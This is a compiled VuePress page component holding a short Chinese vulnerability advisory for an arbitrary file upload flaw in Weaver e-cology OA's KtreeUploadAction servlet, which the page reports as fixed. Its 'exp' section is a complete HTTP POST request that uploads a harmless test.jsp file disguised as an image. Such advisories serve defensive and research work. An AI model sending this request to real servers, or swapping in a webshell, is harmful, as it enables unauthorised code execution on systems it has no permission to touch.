import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as t,c as d,a as e,b as n,d as r,e as l}from"./app-58e4a7d6.js";const c={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),m=e("p",null,"参考链接：",-1),v={href:"https://mp.weixin.qq.com/s?__biz=MzkxMzIzNTU5Mg==&mid=2247483666&idx=1&sn=e70efe98c064e0f1df986e2b65c1a608&chksm=c1018af5f67603e39ce4d6e9375875e63e7b80633a1f99959f8d4652193ac3734765a99099ea&mpshare=1&scene=23&srcid=0414cqXy50udQOy19LYOMega&sharer_sharetime=1618332600979&sharer_shareid=d15208c7b27f111e2fe465f389ab6fac#rd",target:"_blank",rel:"noopener noreferrer"},u=l(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>目前已修复
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>定位文件：</p><p><code>ecology\\CLASSB~1\\com\\weaver\\formmodel\\apps\\ktree\\servlet\\KtreeUploadAction.class</code></p><p>exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=--------1638451160
Content-Length: 171

----------1638451160
Content-Disposition: form-data; name=&quot;test&quot;; filename=&quot;test.jsp&quot;
Content-Type: image/jpeg

helloword
----------1638451160--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function p(h,_){const a=s("ExternalLinkIcon");return t(),d("div",null,[o,m,e("ul",null,[e("li",null,[e("a",v,[n("泛微e-cology任意文件上传(已修复)"),r(a)])])]),u])}const x=i(c,[["render",p],["__file","泛微OA E-cology KtreeUploadAction 任意文件上传.html.vue"]]);export{x as default};
